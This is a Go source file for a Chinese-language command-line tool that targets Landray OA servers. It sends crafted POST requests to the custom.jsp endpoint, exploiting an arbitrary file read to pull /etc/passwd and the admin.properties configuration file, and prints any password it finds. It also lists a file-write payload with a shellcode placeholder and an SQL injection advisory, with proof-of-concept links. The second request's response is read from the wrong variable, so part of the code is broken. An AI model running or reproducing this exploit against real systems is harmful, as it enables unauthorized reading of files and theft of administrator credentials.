package main

import (
	"flag"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"github.com/fatih/color"
	"fmt"
	"github.com/olekukonko/tablewriter"
)
var url string
func main(){
	flag.StringVar(&url,"u","","需要检测的url")
	flag.Parse()
	if len(os.Args) == 1{
		color.Red("use: " +os.Args[0] +  " " + "show"+ "   显示检测模块")
		color.Green("use: " + os.Args[0] + " " + "-u url" + "   开始检测")
		os.Exit(0)
	}
	if len(os.Args) ==2  && os.Args[1] == "show"{
		start()
		os.Exit(0)
	}
	if url == ""{
		fmt.Println("请输入要检测的url")
		os.Exit(0)
	}
	v()
	resp,err := http.Get(url)
	if err != nil{
		fmt.Println("网站可能不存活,检测失败,请手动尝试")
		os.Exit(0)
	}
	defer resp.Body.Close()
	custom()

}

func custom(){
	fmt.Println("正在检测 : 蓝凌OA custom.jsp 任意文件读取漏洞  -- 读取/etc/passwd")
	resp,_ := http.Post(url + "/sys/ui/extend/varkind/custom.jsp","application/x-www-form-urlencoded",strings.NewReader("var={\"body\":{\"file\":\"file:///etc/passwd\"}}"))
	defer resp.Body.Close()
	body,err := ioutil.ReadAll(resp.Body)
	if err != nil{
		errors()
	}
	str := string(body)
	if strings.Contains(str,"root"){
		color.Red("存在 : 蓝凌OA custom.jsp 任意文件读取漏洞")
		fmt.Println(str)
	}
	fmt.Println("正在检测 : 蓝凌OA custom.jsp 任意文件读取漏洞  -- 读取配置文件(/WEB-INF/KmssConfig/admin.properties)")
	resp1,_ := http.Post(url + "/sys/ui/extend/varkind/custom.jsp","application/x-www-form-urlencoded",strings.NewReader("var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}"))
	defer resp1.Body.Close()
	body1,err1 := ioutil.ReadAll(resp.Body)
	if err1 != nil{
		errors()
	}
	str1 := string(body1)
	if strings.Contains(str1,"password") || strings.Contains(str1,"PASSWORD"){
		color.Red("存在 : 蓝凌OA custom.jsp 任意文件读取漏洞 -- password请自行解密")
		fmt.Println(str1)
	}
}
func start(){
	data := [][]string{
		[]string{"是", "蓝凌OA-custom.jsp任意文件读取漏洞(可rce)", "http://t.hk.uy/nyE"},
		[]string{"否", "蓝凌OA任意文件写入漏洞", "/sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode]"},
		[]string{"否", "CNVD-2021-01363-蓝凌OA-EKP-后台SQL注入漏洞", "http://t.hk.uy/nyX"},
	}
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"检查", "漏洞名称", "Poc/参考"})
	for _, v := range data {
		table.Append(v)
	}
	table.Render()
}
func errors(){
	fmt.Println("读取页面返回失败,请手工判断")
}

func v(){
	fmt.Println("===================================================================================")
	color.Cyan("              _                                     _                     _       ")
	color.Red("             | |                             _     ( )     _             | |      ")
	color.Yellow("  ____   ____| |__   ___  ____  _____  ___ _| |_   |/    _| |_ ___   ___ | |  ___ ")
	color.Blue(" |    \\ / ___)  _ \\ / _ \\|  _ \\| ___ |/___|_   _)       (_   _) _ \\ / _ \\| | /___)")
	color.Magenta(" | | | | |   | | | | |_| | | | | ____|___ | | |_          | || |_| | |_| | ||___ |")
	color.Green(" |_|_|_|_|   |_| |_|\\___/|_| |_|_____|___/   \\__)          \\__)___/ \\___/ \\_|___/ ")
	fmt.Println("===================================================================================")
}